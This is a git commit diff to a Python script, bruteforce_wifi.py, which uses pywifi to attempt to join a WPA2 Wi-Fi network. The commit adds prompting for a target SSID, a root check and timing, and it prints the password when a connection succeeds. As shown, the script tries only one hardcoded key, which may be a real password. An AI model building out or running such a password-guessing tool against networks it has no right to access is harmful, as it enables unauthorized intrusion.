aa7baeef720ee6a414092dd5fd155881938cc18f
prolintos <thedarkillerof44@outlook.com>
2020-12-13 14:44:24 +0100

    want to work on the mac

--- src/OSpy/bruteforce_wifi.py
+++ src/OSpy/bruteforce_wifi.py
@@ -1,14 +1,15 @@
 import pywifi
 from pywifi import const
 import time
+import sys
+import os
+import getopt
 
 
-profile = pywifi.Profile()
-profile.ssid = "Mute all"
-profile.auth = const.AUTH_ALG_OPEN
-profile.akm.append(const.AKM_TYPE_WPA2PSK)
-profile.cipher = const.CIPHER_TYPE_CCMP
-profile.key = "rba5829qaBdk"
+
+if os.getuid() != 0:
+    print("You need to have root privileges to use this program. Please try again using 'sudo'.\n")
+    sys.exit()
 
 wifi = pywifi.PyWiFi()
 ifaces = wifi.interfaces()[0]
@@ -16,6 +17,14 @@ ifaces = wifi.interfaces()[0]
 
 wifi = pywifi.PyWiFi()
 iface = wifi.interfaces()[0]
+
+profile = pywifi.Profile()
+profile.ssid = input("Enter the name of the wifi network you want to try to bruteforce:\n")
+start_time = time.time()
+profile.auth = const.AUTH_ALG_OPEN
+profile.akm.append(const.AKM_TYPE_WPA2PSK)
+profile.cipher = const.CIPHER_TYPE_CCMP
+profile.key = "rba5829qaBdk"
 
 iface.remove_all_network_profiles()
 new_profile = iface.add_network_profile(profile)
@@ -27,7 +36,9 @@ while ifaces.status() == const.IFACE_CONNECTING:
     time.sleep(1)
 
 if ifaces.status() == const.IFACE_CONNECTED:
-    print("youhou")
+    print("Connected ! password for {} is {}\n".format(profile.ssid, profile.key))
+    print("Execution took {} seconds.".format(time.time()-start_time))
+    iface.disconnect()
     exit()
 else:
     print("arf")
